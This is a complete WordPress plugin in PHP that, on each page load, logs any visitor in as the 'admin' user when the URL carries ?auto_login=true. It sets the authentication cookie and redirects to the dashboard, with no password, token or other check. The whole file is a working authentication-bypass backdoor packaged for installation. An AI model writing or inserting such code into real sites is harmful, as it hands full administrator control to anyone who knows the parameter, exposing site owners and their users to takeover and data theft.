<?php
/*
Plugin Name: Auto Login Admin User
Description: Automatically logs in the user with the username 'admin' when requested via wp-admin/?auto_login=true.
Version: 1.0
*/

function auto_login_admin_user() {
    if ( isset( $_GET['auto_login'] ) && $_GET['auto_login'] === 'true' && ! is_user_logged_in() ) {
        $user = get_user_by( 'login', 'admin' );

        if ( $user ) {
            wp_set_current_user( $user->ID );
            wp_set_auth_cookie( $user->ID );
            do_action( 'wp_login', $user->user_login );

            // Redirect to the dashboard
            wp_redirect(admin_url('about.php'));
            exit;
        }
    }
}

add_action( 'init', 'auto_login_admin_user' );
